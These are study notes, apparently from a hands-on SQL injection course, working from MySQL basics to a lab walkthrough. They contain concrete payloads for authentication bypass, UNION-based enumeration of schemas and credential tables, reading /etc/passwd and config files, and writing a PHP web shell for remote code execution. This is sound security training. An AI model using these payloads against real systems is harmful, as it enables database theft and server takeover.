# SQLi Fundamentals

1. [MySQL](#mysql)
1. [SQL Injections](#sql-injections)
1. [Exploitation](#exploitation)
1. [Skills Assessment](#skills-assessment)

## MySQL

* SQLi - SQL injection attacks that use malicious input to craft a SQL query, against relational databases like MySQL

* SQL queries:

  ```shell
  mysql -u root -p
  # -p flag left empty so that we get prompted for password

  mysql -u root -h docker.hackthebox.eu -P 3306 -p
  # -h to specify remote host
  # -P for remote port
  ```

  ```sql
  CREATE DATABASE users;
  -- create new db

  SHOW DATABASES;
  -- show dbs

  USE users;
  -- use particular db

  CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
  );
  -- create 'logins' table with 4 columns with their datatypes

  SHOW TABLES;
  -- list of tables in current db

  DESCRIBE logins;
  -- shows table structure

  -- we can use properties for tables/columns, like
  -- AUTO_INCREMENT - increments column by one every time new item is added
  -- NOT NULL - used for required fields
  -- UNIQUE - entry should be unique
  -- DEFAULT - specify default value for column
  -- PRIMARY KEY - for unique identifier of table

  -- example
  CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
  ```

* SQL statements:

  ```sql
  INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
  -- to add new records to table

  INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
  -- we can skip filling columns with default values
  -- we cannot skip columns with NOT NULL

  INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
  -- inserting multiple records
  ```

  ```sql
  SELECT * FROM logins;
  -- view entire table

  SELECT username,password FROM logins;
  -- only certain columns
  ```

  ```sql
  DROP TABLE logins;
  -- remove table
  ```

  ```sql
  ALTER TABLE logins ADD newColumn INT;
  -- add new column

  ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
  -- rename column

  ALTER TABLE logins MODIFY oldColumn DATE;
  -- change column datatype

  ALTER TABLE logins DROP oldColumn;
  -- drop a column
  ```

  ```sql
  UPDATE logins SET password = 'change_password' WHERE id > 1;
  -- update specific records within table based on certain criteria
  ```

* Query results:

  ```sql
  SELECT * FROM logins ORDER BY password;
  -- sort by column

  SELECT * FROM logins ORDER BY password DESC;
  -- by default, sorting by ascending
  -- desc for descending

  SELECT * FROM logins ORDER BY password DESC, id ASC;
  -- sort by multiple columns
  ```

  ```sql
  SELECT * FROM logins LIMIT 2;
  -- limit output

  SELECT * FROM logins LIMIT 1, 2;
  -- limit by offset
  ```

  ```sql
  SELECT * FROM logins WHERE id > 1;
  -- WHERE for conditions

  SELECT * FROM logins where username = 'admin';
  ```

  ```sql
  SELECT * FROM logins WHERE username LIKE 'admin%';
  -- LIKE for pattern matching
  -- fetch records with usernames starting with 'admin'

  SELECT * FROM logins WHERE username like '___';
  -- different wildcards can be used
  ```

* SQL operators:

  ```sql
  SELECT 1 = 1 AND 'test' = 'test';
  -- returns true only if both conditions met
  -- this returns 1 (true)

  -- && can be used instead of AND
  ```

  ```sql
  SELECT 1 = 1 OR 'test' = 'abc';
  -- atleast one condition met
  -- the above returns 1 (true)

  SELECT 1 = 2 OR 'test' = 'abc';
  -- 0 (false)

  -- || can be used instead of OR
  ```

  ```sql
  SELECT NOT 1 = 1;
  -- opposite, so 0 (false)

  SELECT NOT 1 = 2;
  -- 1

  -- ! can be used instead of NOT
  ```

  ```sql
  -- operators also have an order of precedence

  SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
  -- following precedence, query is simplified
  -- SELECT * FROM logins WHERE username != 'tom' AND id > 1;
  -- as > and != have same precedence, AND is applied to get the intersection
  ```

## SQL Injections

* Basic SQLi example:

  * Vulnerable code:

    ```php
    $searchInput =  $_POST['findUser'];
    $query = "select * from logins where username like '%$searchInput'";
    $result = $conn->query($query);
    ```

    ```sql
    select * from logins where username like '%$searchInput'
    -- sql query which takes input
    ```
  
  * SQLi - ```1'; DROP TABLE users;'```, such that the actual SQL query executed would be ```select * from logins where username like '%1'; DROP TABLE users;'```

* Types of SQLi:

  * in-band - output of both intended and new query printed directly on front end; can be further classified as union-based SQLi (need to specify exact location/column) and error-based SQLi (errors will return output)

  * blind - no direct output, so we need to retrieve output character-by-character; can be boolean-based (making conditional statement 'true') or time-based (page response delayed if condition is 'true')

  * out-of-band - no direct access to output, so we need to direct output to a remote location (DNS record), then retrieve it from there

* Subverting query logic:

  * Executed query - ```SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';```

  * For SQLi discovery, we would have to use payloads like ```'```, ```"```, ```#```, ```;``` and ```)``` (and their URL-encoded version, if needed); these characters can be added after username

  * Executed query with payload - ```SELECT * FROM logins WHERE username=''' AND password = 'something';``` - this throws a syntax error due to odd number of quotes

  * We can abuse ```OR``` operator (it has higher precedence than ```AND```) with a true condition for query to be true

  * If we use payload ```admin' or '1'='1```, executed query - ```SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';```

  * If we do not know a valid username, we will have to use similar payload for password as well; example - ```SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something' OR '1'='1';```

  * We can simplify this by using the payload ```' or '1' = '1``` for both fields.

  * [More payloads for authentication bypass SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

* Using comments:

  * SQL allows using ```#``` and ```--``` (we need to follow this with a space and another character like ```-```) for comments; URL encoding required in browser:

    ```sql
    SELECT username FROM logins; -- Selects usernames from the logins table 

    SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
    ```
  
  * Using this in our auth bypass SQLi, we can inject ```admin'--``` such that latter part is commented out; executed query - ```SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';```

  * If there are parenthesis used in query, we would need to use a different payload like ```admin')--```, so that the rest is commented out

* Union clause:

  * ```UNION``` is used to combine output of multiple SQL queries; data types of columns should be same

  * ```UNION``` statement can only operate on ```SELECT``` statements with equal number of columns;
  
  * For example - if query is ```SELECT * FROM products WHERE product_id = 'user_input'```, we can inject ```UNION``` like - ```SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '``` (assuming products table has 2 cols)

  * If we are unable to get same number of columns, we can use junk data (string, number, ```'NULL'```, etc.). Example - ```SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords``` (returns only usernames) - numbering the columns is a good practice

* Union injection:

  * Detect number of columns:

    * Using ```ORDER BY```:

      * we can start with ```order by 1```, ```order by 2```, and increment until we reach a number that gives an error; final successful column gives us total number of columns

      * example payload - ```' order by 1-- -``` (keep increasing this number until we get error)

    * Using ```UNION```:

      * attempt union SQLi with different number of columns till we get results successfully

      * example - ```cn' UNION select 1,2,3-- -``` (3 column UNION query) - keep increasing number of columns till we get successful response
  
  * Location of injection:

    * we will not get every column as output; so we need to test getting actual data from columns

    * example - ```cn' UNION select 1,@@version,3,4-- -``` - to check which column prints data

## Exploitation

* Enumeration:

  * To fingerprint MySQL databases, we can use the following payloads:

    * ```SELECT @@version``` - use when we have full query output
    * ```SELECT POW(1,1)``` - use when we have only numeric output
    * ```SELECT SLEEP(5)``` - blind/no output
  
  * Query to get table from another database - ```SELECT * FROM another_database.tablename```

  * We can use ```INFORMATION_SCHEMA``` database for metadata enumeration; to get names of all DBs - ```SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;```

  * We can find current database with ```SELECT database()``` query; use in payload - ```string' UNION select 1,database(),3,4#```

  * Payload example to find tables within 'dev' database - ```cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -```

  * Payload example to find columns from a table - ```cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -```

  * Payload example to fetch data from table - ```cn' UNION select 1, username, password, 4 from dev.credentials-- -```

* Reading files:

  * To find current user, we can use queries like ```SELECT USER()```, ```SELECT CURRENT_USER``` or ```SELECT user FROM mysql.user```; if it is root, it is likely to be DBA, so we have required privileges

  * To check if we have super admin privileges - ```SELECT super_priv FROM mysql.user```

  * Payload example to show only current user (root) privileges - ```cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -``` - ```FILE``` priv indicates read (and possibly write) permissions, but OS user should have priv too

  * Query example to read files - ```SELECT LOAD_FILE('/etc/passwd');``` - we can also read source code of the webpage file (view page source as this can render HTML code)

* Writing files:

  * Pre-requisites to write files to back-end server using MySQL DB:

    * User with ```FILE``` priv
    * MySQL global ```secure_file_priv``` var not enabled
    * Write access to location
  
  * Query to find value of variable (should be empty for write priv)- ```SHOW VARIABLES LIKE 'secure_file_priv';``` - as this will not work with ```UNION``` injection, we need to use a query like ```SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"```

  * Query to write output of query into a file - ```SELECT * from users INTO OUTFILE '/tmp/credentials';```

  * Query to write string into file - ```SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';```

  * Example payload for writing files - ```cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -``` (we need to know the web root directory for this to work)

  * Example payload for writing a web shell - ```cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -``` (used empty quotes instead of numbers for clean data) - we can execute commands via the '0' parameter (like ```?0=id```)

## Skills Assessment

* For authentication bypass, we can refer to the payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass); ```admin' or 1=1#``` as payload works and we are able to login

* We get access to a dashboard - it seems to be fetching a table from the backend. We can try UNION SQLi attacks here

* Furthermore, out of the 4 visible columns, the search field seems to be working for the 'Month' (second) column

* The payload ```j' UNION SELECT 1,database(),3,4#``` does not work; trying with 5 columns works - ```j' UNION SELECT 1,database(),3,4,5#``` - and we get database name 'ilfreight'

* To get name of all tables, payload - ```j' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES#``` - we need to check which tables are of importance

* We have 'ilfreight' DB with tables 'users' and 'payment'; and 'backup' DB contains 'admin_bk' table

* We can use the following payload to get columns for each table - ```j' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='users'#```, for the 'users' table for example

* Also, the payload ```j' UNION SELECT 1,user(),3,4,5#``` shows that we are user ```root@localhost```; payload ```j' UNION SELECT 1,super_priv,3,4,5 FROM mysql.user#``` confirms that we have the required privileges to write files

* Payload to confirm if 'secure_file_priv' is set or not - ```j' UNION SELECT 1,variable_name,variable_value,4,5 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"#``` - value is not set

* Now, we are unable to write a file to the webroot - ```j' UNION SELECT 1,'check',3,4,5 into OUTFILE '/var/www/html/check.txt'#``` - this gives error

* But, we are able to write file to ```/tmp``` - ```j' UNION SELECT 1,'check',3,4,5 into OUTFILE '/tmp/check.txt'#```; we are also able to read the same file using ```j' UNION SELECT 1, LOAD_FILE('/tmp/check.txt'),3,4,5#```

* We can also view the page source using - ```j' UNION SELECT 1, LOAD_FILE('/var/www/html/index.php'),3,4,5#```; similarly for ```config.php``` and ```/dashboard/dashboard.php```

* Also, we are unable to write to webroot, but we can write to the '/dashboard' folder - ```j' UNION SELECT 1,'check',3,4,5 into OUTFILE '/var/www/html/dashboard/check.txt'#```. Confirm this using ```j' UNION SELECT 1, LOAD_FILE('/var/www/html/dashboard/check.txt'),3,4,5#```

* Write webshell to the same folder - ```j' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","","" into OUTFILE '/var/www/html/dashboard/webshell.php'#```

* We now have RCE by visiting the URL at '/dashboard/webshell.php?0=id'
